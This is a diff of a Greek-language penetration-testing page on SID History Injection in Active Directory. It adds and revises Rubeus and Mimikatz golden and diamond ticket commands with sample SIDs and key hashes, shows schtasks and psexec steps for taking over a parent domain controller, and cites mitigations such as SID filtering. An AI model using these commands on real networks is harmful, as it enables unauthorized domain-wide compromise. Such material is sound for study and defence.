@@ -4,19 +4,47 @@
 
 ## SID History Injection Attack
 
-Η εστίαση της **Επίθεσης Εισαγωγής Ιστορικού SID** είναι η βοήθεια **μεταφοράς χρηστών μεταξύ τομέων** ενώ διασφαλίζεται η συνεχής πρόσβαση σε πόρους από τον πρώην τομέα. Αυτό επιτυγχάνεται με **την ενσωμάτωση του προηγούμενου Αναγνωριστικού Ασφαλείας (SID) του χρήστη στο Ιστορικό SID** του νέου του λογαριασμού. Σημαντικό είναι ότι αυτή η διαδικασία μπορεί να παραποιηθεί για να παραχωρήσει μη εξουσιοδοτημένη πρόσβαση προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή οι Domain Admins) από τον γονικό τομέα στο Ιστορικό SID. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του γονικού τομέα.
+Ο στόχος της **Επίθεσης Εισαγωγής Ιστορικού SID** είναι η βοήθεια **μεταφοράς χρηστών μεταξύ τομέων** ενώ διασφαλίζεται η συνεχής πρόσβαση σε πόρους από τον πρώην τομέα. Αυτό επιτυγχάνεται με **την ενσωμάτωση του προηγούμενου Αναγνωριστικού Ασφαλείας (SID) του χρήστη στο Ιστορικό SID** του νέου του λογαριασμού. Σημαντικά, αυτή η διαδικασία μπορεί να παραποιηθεί για να παραχωρήσει μη εξουσιοδοτημένη πρόσβαση προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή οι Domain Admins) από τον γονικό τομέα στο Ιστορικό SID. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του γονικού τομέα.
 
-Υπάρχουν δύο μέθοδοι για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.
+Δύο μέθοδοι υπάρχουν για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.
 
 Για να προσδιορίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να εντοπίσετε το SID του ριζικού τομέα. Αφού γίνει η αναγνώριση, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας `-519` στο SID του ριζικού τομέα. Για παράδειγμα, αν το SID του ριζικού τομέα είναι `S-1-5-21-280534878-1496970234-700767426`, το αποτέλεσμα SID για την ομάδα "Enterprise Admins" θα ήταν `S-1-5-21-280534878-1496970234-700767426-519`.
 
 Μπορείτε επίσης να χρησιμοποιήσετε τις ομάδες **Domain Admins**, οι οποίες τελειώνουν σε **512**.
 
 Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας του άλλου τομέα (για παράδειγμα "Domain Admins") είναι με:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-### Χρυσό Εισιτήριο (Mimikatz) με KRBTGT-AES256
+> [!WARNING]
+> Σημειώστε ότι είναι δυνατόν να απενεργοποιήσετε την ιστορία SID σε μια σχέση εμπιστοσύνης, γεγονός που θα αποτύχει αυτή την επίθεση.
+
+Σύμφωνα με τα [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Απενεργοποίηση της SIDHistory σε δασικές εμπιστοσύνες** χρησιμοποιώντας το εργαλείο netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Εφαρμογή SID Filter Quarantining σε εξωτερικές εμπιστοσύνες** χρησιμοποιώντας το εργαλείο netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Εφαρμογή SID Filtering σε εμπιστοσύνες τομέα εντός ενός μόνο δάσους** δεν συνιστάται καθώς είναι μια μη υποστηριζόμενη διαμόρφωση και μπορεί να προκαλέσει σοβαρές αλλαγές. Εάν ένας τομέας εντός ενός δάσους είναι αναξιόπιστος, τότε δεν θα πρέπει να είναι μέλος του δάσους. Σε αυτή την περίπτωση, είναι απαραίτητο πρώτα να διαχωριστούν οι αξιόπιστοι και οι αναξιόπιστοι τομείς σε ξεχωριστά δάση όπου μπορεί να εφαρμοστεί το SID Filtering σε μια διασυνοριακή εμπιστοσύνη.
+
+Δείτε αυτή την ανάρτηση για περισσότερες πληροφορίες σχετικά με την παράκαμψη αυτού: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+Την τελευταία φορά που το δοκίμασα, χρειάστηκε να προσθέσω το arg **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
+```
+### Golden Ticket (Mimikatz) με KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -33,23 +61,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Για περισσότερες πληροφορίες σχετικά με τα χρυσά εισιτήρια, ελέγξτε:
+Για περισσότερες πληροφορίες σχετικά με τα golden tickets, ελέγξτε:
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### Διαμαντένιο Εισιτήριο (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
-Για περισσότερες πληροφορίες σχετικά με τα διαμάντια ελέγξτε:
+Για περισσότερες πληροφορίες σχετικά με τα diamond tickets, ελέγξτε:
 
 {{#ref}}
 diamond-ticket.md
@@ -71,7 +90,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Με τις αποκτηθείσες άδειες από την επίθεση μπορείτε να εκτελέσετε για παράδειγμα μια επίθεση DCSync στο νέο τομέα:
+Με τις αποκτηθείσες άδειες από την επίθεση μπορείτε να εκτελέσετε, για παράδειγμα, μια επίθεση DCSync στο νέο τομέα:
 
 {{#ref}}
 dcsync.md
@@ -99,11 +118,11 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Αυτόματα χρησιμοποιώντας [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 Αυτό είναι ένα σενάριο Impacket που θα **αυτοματοποιήσει την αναβάθμιση από το παιδικό στο γονικό domain**. Το σενάριο χρειάζεται:
 
-- Στοχευμένος ελεγκτής τομέα
+- Στοχοθετημένος ελεγκτής τομέα
 - Διαπιστευτήρια για έναν διαχειριστή χρήστη στο παιδικό domain
 
 Η ροή είναι:
